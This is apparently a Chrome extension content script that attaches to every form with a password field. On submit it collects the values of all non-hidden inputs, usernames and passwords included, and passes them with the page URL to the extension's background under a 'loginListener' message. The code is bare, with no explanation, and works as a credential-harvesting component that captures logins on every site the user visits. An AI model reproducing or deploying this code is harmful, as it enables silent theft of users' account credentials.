var input_list = document.getElementsByTagName("input");
Array.prototype.forEach.call(input_list, function(input) {
    if (input.getAttribute("type") === "password"){
        var form = input.form;
        form.addEventListener("submit", function(input) {
            var inputs = form.getElementsByTagName("input");
            var message = '';
            Array.prototype.forEach.call(inputs, function(input) {
                if (!(["hidden", "submit"].indexOf(input.getAttribute("type")) >= 0)) {
                    message += input.value + ": ";
                }
            });
            chrome.runtime.sendMessage({loginListener: location.href + ", " + message.slice(0, -2)});
        }, false);
    }
});